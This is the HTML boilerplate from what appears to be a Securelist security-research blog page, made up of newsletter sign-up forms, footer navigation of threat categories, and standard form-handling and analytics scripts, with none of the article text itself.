                        <div class="gform-content-wrapper"><div class='gform_body gform-body'><div id='gform_fields_2917778541' class='gform_fields top_label form_sublabel_below description_below'><div id="field_11_1" class="gfield gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><label class='gfield_label screen-reader-text' for='input_2917778541_1' >Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
                            <input name='input_1' id='input_2917778541_1' type='text' value='' class='medium'   placeholder='Email' aria-required="true" aria-invalid="false"  />
                        </div></div><div id="field_11_3" class="gfield js-kaspersky-gform-recaptcha-placeholder gform_hidden field_sublabel_below field_description_below gfield_visibility_hidden" ><div class='ginput_container ginput_container_text'><input name='input_3' id='input_2917778541_3' type='hidden' class='gform_hidden'  aria-invalid="false" value='' /></div></div><fieldset id="field_11_2" class="gfield input-without-label label-gdpr gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><legend class='gfield_label screen-reader-text gfield_label_before_complex'  ><span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></legend><div class='ginput_container ginput_container_checkbox'><div class='gfield_checkbox' id='input_2917778541_2'><div class='gchoice gchoice_11_2_1'>
								<input class='gfield-choice-input' name='input_2.1' type='checkbox'  value='I agree'  id='choice_2917778541_11_2_1'   />
								<label for='choice_2917778541_11_2_1' id='label_2917778541_11_2_1'>I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.</label>
							</div></div></div></fieldset></div></div>
        <div class='gform_footer top_label'> 	<button class="gform_button button" type="submit" id='gform_submit_button_2917778541' value="Sign up">
		<svg class="o-icon o-svg-icon o-svg-large u-hidden u-inline-block@sm"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-envelope"></use></svg>		<span class="u-hidden u-inline@sm">Subscribe</span>
		<span class="u-hidden@sm"><svg class="o-icon o-svg-icon o-svg-right"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-arrow"></use></svg></span>
	</button>
		 <input type='hidden' name='gform_ajax' value='form_id=11&amp;title=&amp;description=&amp;tabindex=0' />
            <input type='hidden' class='gform_hidden' name='is_submit_11' value='1' />
            <input type='hidden' class='gform_hidden' name='gform_submit' value='11' />
            
            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
            <input type='hidden' class='gform_hidden' name='state_11' value='WyJbXSIsImIwODQwZTA2ZGQ0NzYwODcyOTBkZjNmZDM1NDk2Y2ZkIl0=' />
            <input type='hidden' class='gform_hidden' name='gform_target_page_number_11' id='gform_target_page_number_2917778541_11' value='0' />
            <input type='hidden' class='gform_hidden' name='gform_source_page_number_11' id='gform_source_page_number_2917778541_11' value='1' />
            <input type='hidden' name='gform_random_id' value='2917778541' /><input type='hidden' name='gform_field_values' value='securelist_2020_form_location=' />
            
        </div>
                        </div><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_3" name="ak_js" value="35"/><script>document.getElementById( "ak_js_3" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>
                        </div>
                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_2917778541' id='gform_ajax_frame_2917778541' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
                <script type="text/javascript">
/* <![CDATA[ */
 gform.initializeOnLoaded( function() {gformInitSpinner( 2917778541, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery('#gform_ajax_frame_2917778541').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_2917778541');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_2917778541').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_2917778541').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_2917778541').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_2917778541').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_2917778541').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_2917778541_11').val();gformInitSpinner( 2917778541, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery(document).trigger('gform_page_loaded', [2917778541, current_page]);window['gf_submitting_2917778541'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_2917778541').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_2917778541').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [2917778541]);window['gf_submitting_2917778541'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_2917778541').text());}, 50);}else{jQuery('#gform_2917778541').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [2917778541, current_page]);} );} ); 
/* ]]> */
</script>
					</div>
				</div>
			</div>
						<div class="u-hidden@sm u-mb-spacer-base-">
				<div class="c-image c-image--overflow-down@sm">
					<a href="https://xtraining.kaspersky.com/?icid=gl_securelist_acq_ona_smm__all_b2b_securelist_ban_sm-team___xtraining____9a8b46fb8b50f071"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/17081841/Christmas_800x800-1-740x740.png" /></a>				</div>
			</div>
					</div>
	</section>
	</div><!-- /.c-page -->

<section class="c-block c-block--spacing-t-small c-block--spacing-t-large@md c-block--spacing-b c-page-footer c-block--bg-image c-color--invert" style="background-image: url(https://securelist.com/wp-content/themes/securelist2020/assets/images/content/bg-gradient-02.jpg);">
	<div class="o-container-fluid">
		<div data-element-id="footer-content-block" class="c-page-footer__content">
			<div class="o-row o-row--reverse">
				<div class="o-col-9@md">
					<div class="c-page-menu">
						<div class="o-row c-page-menu__dividers">
							<div class="o-col-4@md"><div class="c-accordion js-accordion c-accordion--reset@md"><p class="menu-item-threats section-title accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-226 c-page-menu__title u-hidden u-block@md"><a href="https://securelist.com/threat-categories/" data-element-id="footer-content-link">Threats</a></p><div class="c-accordion-toggle js-accordion-toggle"><p>Threats</p></div><div class="c-accordion-container js-accordion-container">
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category current-post-ancestor current-menu-parent current-post-parent menu-item-99839"><a href="https://securelist.com/threat-category/apt-targeted-attacks/" data-element-id="footer-content-link">APT (Targeted attacks)</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89457"><a href="https://securelist.com/threat-category/secure-environment/" data-element-id="footer-content-link">Secure environment (IoT)</a></li>
	<li class="topic-item vulnerabilities menu-item menu-item-type-custom menu-item-object-custom menu-item-63231"><a href="https://securelist.com/threat-category/mobile-threats/" data-element-id="footer-content-link">Mobile threats</a></li>
	<li class="topic-item detected menu-item menu-item-type-custom menu-item-object-custom menu-item-63229"><a href="https://securelist.com/threat-category/financial-threats/" data-element-id="footer-content-link">Financial threats</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89458"><a href="https://securelist.com/threat-category/spam-and-phishing/" data-element-id="footer-content-link">Spam and phishing</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-99840"><a href="https://securelist.com/threat-category/industrial-threats/" data-element-id="footer-content-link">Industrial threats</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-threat-category menu-item-89465"><a href="https://securelist.com/threat-category/web-threats/" data-element-id="footer-content-link">Web threats</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-89459"><a href="https://securelist.com/threat-category/vulnerabilities-and-exploits/" data-element-id="footer-content-link">Vulnerabilities and exploits</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-113855"><a href="https://securelist.com/threat-categories/" data-element-id="footer-content-link">All threats</a></li>
</ul>
</li>
</li></ul></div></div></div><div class="o-col-4@md"><div class="c-accordion js-accordion c-accordion--reset@md"><p class="menu-item-categories section-title accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-230 c-page-menu__title u-hidden u-block@md"><a href="https://securelist.com/categories/" data-element-id="footer-content-link">Categories</a></p><div class="c-accordion-toggle js-accordion-toggle"><p>Categories</p></div><div class="c-accordion-container js-accordion-container">
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-84158"><a href="https://securelist.com/category/apt-reports/" data-element-id="footer-content-link">APT reports</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99841"><a href="https://securelist.com/category/malware-descriptions/" data-element-id="footer-content-link">Malware descriptions</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84160"><a href="https://securelist.com/category/kaspersky-security-bulletin/" data-element-id="footer-content-link">Security Bulletin</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84161"><a href="https://securelist.com/category/malware-reports/" data-element-id="footer-content-link">Malware reports</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-89460"><a href="https://securelist.com/category/spam-and-phishing-reports/" data-element-id="footer-content-link">Spam and phishing reports</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-99842"><a href="https://securelist.com/category/security-technologies/" data-element-id="footer-content-link">Security technologies</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84165"><a href="https://securelist.com/category/research/" data-element-id="footer-content-link">Research</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-84164"><a href="https://securelist.com/category/publications/" data-element-id="footer-content-link">Publications</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-113876"><a href="https://securelist.com/categories/" data-element-id="footer-content-link">All categories</a></li>
</ul>
</li>
</li></ul></div></div></div><div class="o-col-4@md"><p class="menu-item-tags section-title after-accordion menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-277 c-page-menu__title u-hidden u-block@md"><a data-element-id="footer-content-link">Other sections</a></p>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-100526"><a href="https://securelist.com/all/" data-element-id="footer-content-link">Archive</a></li>
	<li class="show-all-tags menu-item menu-item-type-post_type menu-item-object-page menu-item-57837"><a href="https://securelist.com/tags/" data-element-id="footer-content-link">All tags</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101956"><a href="https://securelist.com/webinars/" data-element-id="footer-content-link">Webinars</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-101126"><a target="_blank" rel="noopener noreferrer" href="https://apt.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="footer-content-link">APT Logbook</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-241"><a target="_blank" rel="noopener noreferrer" href="https://statistics.securelist.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="footer-content-link">Statistics</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-86643"><a target="_blank" rel="noopener noreferrer" href="https://encyclopedia.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="footer-content-link">Encyclopedia</a></li>
	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-58141"><a target="_blank" rel="noopener noreferrer" href="https://threats.kaspersky.com/?icid=gl_seclistheader_acq_ona_smm__onl_b2b_securelist_main-menu_sm-team_______001391deb99c290f" data-element-id="footer-content-link">Threats descriptions</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-111312"><a href="https://securelist.com/ksb-2023/" data-element-id="footer-content-link">KSB 2023</a></li>
</ul>
</li>
</div>						</div>
					</div>
				</div>
				<div class="o-col-3@md">
					<div class="c-site-logo c-site-logo--kaspersky"></div>
				</div>
			</div>
		</div>
		<div data-element-id="footer-menu-block" class="c-page-footer__wrapper">
			<div class="c-page-footer__info">
								<p>© 2024 AO Kaspersky Lab. All Rights Reserved.<br />
Registered trademarks and service marks are the property of their respective owners.</p>
							</div>
			<div class="c-page-footer__links">
				<ul>
																<li><a data-element-id="footer-menu-link" href="https://www.kaspersky.com/web-privacy-policy?icid=gl_seclistfooter_acq_ona_smm__onl_b2b_securelist_footer_sm-team_______11d7a8212d94123d">Privacy Policy</a></li>
																<li><a data-element-id="footer-menu-link" href="https://www.kaspersky.com/end-user-license-agreement?icid=gl_seclistfooter_acq_ona_smm__onl_b2b_securelist_footer_sm-team_______11d7a8212d94123d">License Agreement</a></li>
																<li><a data-element-id="footer-menu-link" href="javascript: void(0);" onclick="javascript: Cookiebot.renew()">Cookies</a></li>
									</ul>
			</div>
		</div>
	</div>
</section>

<div id="modal-newsletter" class="c-modal__wrapper c-modal__wrapper--sm mfp-hide">
	<div class="c-modal">
		<a href="#" class="c-modal-close js-modal-close"></a>
		<div class="c-modal__main">
			<div class="c-block c-block--spacing-t-small c-block--spacing-b-small">
				<div class="o-container-fluid">
					<div class="c-block__header">
						<h5 class="c-title--small">Subscribe to our weekly e-mails</h5>
						<p>The hottest research right in your inbox</p>
					</div>
					<div class="c-form--float-labels js-float-labels">
						
                <div class='gf_browser_chrome gform_wrapper gform_wrapper_original_id_11 gravity-theme subscribe-mc_wrapper' id='gform_wrapper_2892687201' ><div id='gf_2892687201' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_2892687201' id='gform_2892687201' class='subscribe-mc' action='/the-zero-day-exploits-of-operation-wizardopium/97086/#gf_2892687201' >
                        <div class="gform-content-wrapper"><div class='gform_body gform-body'><div id='gform_fields_2892687201' class='gform_fields top_label form_sublabel_below description_below'><div id="field_11_1" class="gfield gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><label class='gfield_label screen-reader-text' for='input_2892687201_1' >Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
                            <input name='input_1' id='input_2892687201_1' type='text' value='' class='medium'   placeholder='Email' aria-required="true" aria-invalid="false"  />
                        </div></div><div id="field_11_3" class="gfield js-kaspersky-gform-recaptcha-placeholder gform_hidden field_sublabel_below field_description_below gfield_visibility_hidden" ><div class='ginput_container ginput_container_text'><input name='input_3' id='input_2892687201_3' type='hidden' class='gform_hidden'  aria-invalid="false" value='' /></div></div><fieldset id="field_11_2" class="gfield input-without-label label-gdpr gfield_contains_required field_sublabel_below field_description_below gfield_visibility_visible" ><legend class='gfield_label screen-reader-text gfield_label_before_complex'  ><span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></legend><div class='ginput_container ginput_container_checkbox'><div class='gfield_checkbox' id='input_2892687201_2'><div class='gchoice gchoice_11_2_1'>
								<input class='gfield-choice-input' name='input_2.1' type='checkbox'  value='I agree'  id='choice_2892687201_11_2_1'   />
								<label for='choice_2892687201_11_2_1' id='label_2892687201_11_2_1'>I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.</label>
							</div></div></div></fieldset></div></div>
        <div class='gform_footer top_label'> 	<button type="submit" class="gform_button button" id='gform_submit_button_2892687201' value="Sign up">
		<svg class="o-icon o-svg-icon o-svg-large"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-envelope"></use></svg>		<span>Subscribe</span>
	</button>

	 <input type='hidden' name='gform_ajax' value='form_id=11&amp;title=&amp;description=&amp;tabindex=0' />
            <input type='hidden' class='gform_hidden' name='is_submit_11' value='1' />
            <input type='hidden' class='gform_hidden' name='gform_submit' value='11' />
            
            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
            <input type='hidden' class='gform_hidden' name='state_11' value='WyJbXSIsImIwODQwZTA2ZGQ0NzYwODcyOTBkZjNmZDM1NDk2Y2ZkIl0=' />
            <input type='hidden' class='gform_hidden' name='gform_target_page_number_11' id='gform_target_page_number_2892687201_11' value='0' />
            <input type='hidden' class='gform_hidden' name='gform_source_page_number_11' id='gform_source_page_number_2892687201_11' value='1' />
            <input type='hidden' name='gform_random_id' value='2892687201' /><input type='hidden' name='gform_field_values' value='securelist_2020_form_location=sidebar' />
            
        </div>
                        </div><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_4" name="ak_js" value="69"/><script>document.getElementById( "ak_js_4" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>
                        </div>
                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_2892687201' id='gform_ajax_frame_2892687201' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
                <script type="text/javascript">
/* <![CDATA[ */
 gform.initializeOnLoaded( function() {gformInitSpinner( 2892687201, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery('#gform_ajax_frame_2892687201').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_2892687201');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_2892687201').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_2892687201').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_2892687201').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_2892687201').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_2892687201').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_2892687201_11').val();gformInitSpinner( 2892687201, 'https://securelist.com/wp-content/themes/securelist2020/assets/images/content/ajax-spinner-red.svg' );jQuery(document).trigger('gform_page_loaded', [2892687201, current_page]);window['gf_submitting_2892687201'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_2892687201').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_2892687201').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [2892687201]);window['gf_submitting_2892687201'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_2892687201').text());}, 50);}else{jQuery('#gform_2892687201').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [2892687201, current_page]);} );} ); 
/* ]]> */
</script>
					</div>
				</div>
			</div>
		</div><!-- /.c-modal__main -->
	</div><!-- /.c-modal -->
</div><!-- /.c-modal__wrapper -->
            <script type="text/javascript">
            if ( typeof _recaptcha_wordpress_savedcomment != 'undefined') {
                document.getElementById('comment').value =
                    _recaptcha_wordpress_savedcomment;
            }
            </script><script type="text/javascript" src="https://kasperskycontenthub.com/securelist/wp-content/plugins/kaspersky-embeds/js/scripts.js?ver=1.0" id="kspr_embeds-js"></script>
<script type="text/javascript" src="https://www.google.com/recaptcha/api.js?render=explicit&amp;ver=202124050927" id="kaspersky-dynamic-gravity-forms-google-recaptcha-js"></script>
<script type="text/javascript" id="crayon_js-js-extra">
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/securelist.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type="text/javascript" id="kaspersky-dynamic-gravity-forms-main-js-extra">
/* <![CDATA[ */
var kasperskyDynamicaReCaptchaData = {"ajaxUrl":"https:\/\/securelist.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="text/javascript" id="kaspersky-omniture-js-extra">
/* <![CDATA[ */
var kaspersky = {"pageName":"Kaspersky Securelist","pageType":"blog","platformName":"Micro Site","businessType":"b2c","siteLocale":"en-GLOBAL"};
/* ]]> */
</script>
<script type="text/javascript" id="wp-autosearch-script-js-extra">
/* <![CDATA[ */
var wp_autosearch_config = {"autocomplete_taxonomies":{"0":"category"},"split_results_by_type":"true","search_title":"true","search_content":"false","search_terms":"false","search_exactonly":"true","order_by":"title","order":"DESC","search_comments":"false","search_tags":"false","no_of_results":"5","description_limit":"100","title_limit":"50","excluded_ids":{},"excluded_cats":{"0":0},"full_search_url":"https:\/\/kasperskycontenthub.com\/securelist\/?s=%q%","min_chars":"3","ajax_delay":"200","cache_length":"200","autocomplete_sortorder":"posts","thumb_image_display":"false","thumb_image_width":"50","thumb_image_height":"50","get_first_image":"true","force_resize_first_image":"true","thumb_image_crop":"true","default_image":"https:\/\/kasperskycontenthub.com\/securelist\/wp-content\/plugins\/wp-autosearch\/assert\/image\/default.png","search_image":"","display_more_bar":"false","display_result_title":"false","enable_token":"true","custom_css":"","custom_js":"","try_full_search_text":"Search more...","no_results_try_full_search_text":"No Results!","show_author":"false","show_date":"false","description_result":"false","color":{"results_even_bar":"E8E8E8","results_odd_bar":"FFFFFF","results_even_text":"000000","results_odd_text":"000000","results_hover_bar":"5CCCB2","results_hover_text":"FFFFFF","seperator_bar":"2D8DA0","seperator_hover_bar":"6A81A0","seperator_text":"FFFFFF","seperator_hover_text":"FFFFFF","more_bar":"5286A0","more_hover_bar":"4682A0","more_text":"FFFFFF","more_hover_text":"FFFFFF","box_border":"57C297","box_background":"FFFFFF","box_text":"000000"},"title":{"page":"Pages","post":"Posts","webinars":"Webinars"},"post_types":{"0":"page","1":"post","2":"webinars"},"nonce":"43c2280af6","ajax_url":"https:\/\/securelist.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="text/javascript" id="securelist-script-js-extra">
/* <![CDATA[ */
var securelist2020Data = {"ajaxUrl":"https:\/\/securelist.com\/wp-admin\/admin-ajax.php","loading":"Loading...","marketoBaseURL":"","marketoVirtualForm":"27241","munchkinID":"802-IJN-240","reCaptcha_key":"6Lf2eUQUAAAAAC-GQSZ6R2pjePmmD6oA6F_3AV7j"};
/* ]]> */
</script>
<script type='text/javascript' src='//assets.kasperskycontenthub.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js,wp-content/plugins/kaspersky-gravity-forms-dynamic-recaptcha/assets/js/main.js,wp-content/plugins/kaspersky-lazy-load/assets/js/main.js,wp-content/plugins/kaspersky-omniture/assets/dataLayer.js,wp-content/plugins/kaspersky-wp-autosearch/assert/js/migrate.js,wp-content/plugins/kaspersky-wp-autosearch/assert/js/autocomplete.js,wp-content/plugins/kaspersky-wp-autosearch/assert/js/ajax-script.js,wp-content/plugins/wds-no-login-autocomplete/js/script.js,wp-content/themes/securelist2020/assets/js/main.js,wp-includes/js/comment-reply.min.js'></script>
<script type='text/javascript' src='//assets.kasperskycontenthub.com/wp-content/plugins/bwp-minify/min/?f=wp-content/plugins/akismet/_inc/akismet-frontend.js,wp-includes/js/dist/vendor/wp-polyfill-inert.min.js,wp-includes/js/dist/vendor/regenerator-runtime.min.js,wp-includes/js/dist/vendor/wp-polyfill.min.js,wp-includes/js/dist/dom-ready.min.js,wp-includes/js/dist/hooks.min.js,wp-includes/js/dist/i18n.min.js,wp-includes/js/dist/a11y.min.js'></script>
<script type="text/javascript" defer='defer' src="https://securelist.com/wp-content/plugins/gravityforms/js/jquery.json.min.js?ver=2.5.16.3" id="gform_json-js"></script>
<script type="text/javascript" id="gform_gravityforms-js-extra">
/* <![CDATA[ */
var gform_i18n = {"datepicker":{"days":{"monday":"Mon","tuesday":"Tue","wednesday":"Wed","thursday":"Thu","friday":"Fri","saturday":"Sat","sunday":"Sun"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":1,"iconText":"Select date"}};
var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
var gf_legacy_multi = {"11":""};
var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
var gf_legacy_multi = {"11":""};
var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/securelist.com\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
var gf_legacy_multi = {"11":""};
/* ]]> */
</script>
<script type="text/javascript" defer='defer' src="https://securelist.com/wp-content/plugins/gravityforms/js/gravityforms.min.js?ver=2.5.16.3" id="gform_gravityforms-js"></script>
<script type="text/javascript" defer='defer' src="https://securelist.com/wp-content/plugins/gravityforms/js/placeholders.jquery.min.js?ver=2.5.16.3" id="gform_placeholder-js"></script>
<script type="text/javascript">
/* <![CDATA[ */
 gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 11) {if(typeof Placeholders != 'undefined'){
                        Placeholders.enable();
                    }} } );jQuery(document).bind('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } ); 
/* ]]> */
</script>
<script type="text/javascript">
/* <![CDATA[ */
 gform.initializeOnLoaded( function() { jQuery(document).trigger('gform_post_render', [11, 1]) } ); 
/* ]]> */
</script>

</body>
</html>
